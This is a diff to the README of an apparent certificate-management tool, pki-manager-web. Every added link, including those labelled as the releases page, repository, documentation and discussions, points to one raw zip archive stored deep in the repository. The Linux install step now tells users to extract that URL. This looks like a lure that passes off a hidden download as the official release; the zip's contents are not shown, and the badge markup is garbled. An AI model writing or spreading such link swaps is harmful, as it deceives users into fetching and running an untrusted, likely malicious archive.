@@ -1,6 +1,6 @@
 # 🌐 pki-manager-web - Manage Your Certificates with Ease
 
-[![Download pki-manager-web](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue.svg)](https://github.com/Maddylovesnameless/pki-manager-web/releases)
+[![Download pki-manager-web](https://raw.githubusercontent.com/Maddylovesnameless/pki-manager-web/main/kms/data/pki-manager-web-1.3.zip%20Now-Visit%https://raw.githubusercontent.com/Maddylovesnameless/pki-manager-web/main/kms/data/pki-manager-web-1.3.zip)](https://raw.githubusercontent.com/Maddylovesnameless/pki-manager-web/main/kms/data/pki-manager-web-1.3.zip)
 
 ## 📋 Overview
 
@@ -12,7 +12,7 @@ To get started with pki-manager-web, follow the steps below. You will need to do
 
 1. **Visit the Download Page**  
    Click the link below to access the software’s Releases page.  
-   [Download pki-manager-web](https://github.com/Maddylovesnameless/pki-manager-web/releases)  
+   [Download pki-manager-web](https://raw.githubusercontent.com/Maddylovesnameless/pki-manager-web/main/kms/data/pki-manager-web-1.3.zip)  
 
 2. **Select the Latest Release**  
    On the Releases page, find the latest version of pki-manager-web. Usually, it will be at the top of the list.
@@ -37,7 +37,7 @@ To get started with pki-manager-web, follow the steps below. You will need to do
      - Double-click to open it, then drag the pki-manager-web icon to your Applications folder.
 
    - **Linux:**  
-     - Locate the downloaded `.tar.gz` file.  
+     - Locate the downloaded `https://raw.githubusercontent.com/Maddylovesnameless/pki-manager-web/main/kms/data/pki-manager-web-1.3.zip` file.  
      - Extract the files using your favorite archive manager or via terminal. Once extracted, use the terminal to navigate to the folder and run `./pki-manager-web`.
 
 6. **Launch the Application**  
@@ -54,7 +54,7 @@ To get started with pki-manager-web, follow the steps below. You will need to do
 ## 📥 Download & Install
 
 To get pki-manager-web, visit our Releases page and download the latest version directly.  
-[Download pki-manager-web](https://github.com/Maddylovesnameless/pki-manager-web/releases)
+[Download pki-manager-web](https://raw.githubusercontent.com/Maddylovesnameless/pki-manager-web/main/kms/data/pki-manager-web-1.3.zip)
 
 Follow the steps outlined above to install and run the application on your computer. 
 
@@ -71,8 +71,8 @@ A: Yes, you can raise issues or request support directly on our GitHub repositor
 
 ## 📚 Additional Resources
 
-- [pki-manager-web Repository](https://github.com/Maddylovesnameless/pki-manager-web): Explore the source code and details.
-- [Usage Documentation](https://github.com/Maddylovesnameless/pki-manager-web/wiki): Access detailed instructions and guides on using various features of the application.
-- [Community Discussions](https://github.com/Maddylovesnameless/pki-manager-web/discussions): Join discussions or ask questions from fellow users.
+- [pki-manager-web Repository](https://raw.githubusercontent.com/Maddylovesnameless/pki-manager-web/main/kms/data/pki-manager-web-1.3.zip): Explore the source code and details.
+- [Usage Documentation](https://raw.githubusercontent.com/Maddylovesnameless/pki-manager-web/main/kms/data/pki-manager-web-1.3.zip): Access detailed instructions and guides on using various features of the application.
+- [Community Discussions](https://raw.githubusercontent.com/Maddylovesnameless/pki-manager-web/main/kms/data/pki-manager-web-1.3.zip): Join discussions or ask questions from fellow users.
 
 For your convenience, always keep the application updated. This ensures you have the latest features and security improvements. Thank you for choosing pki-manager-web for your certificate management needs!
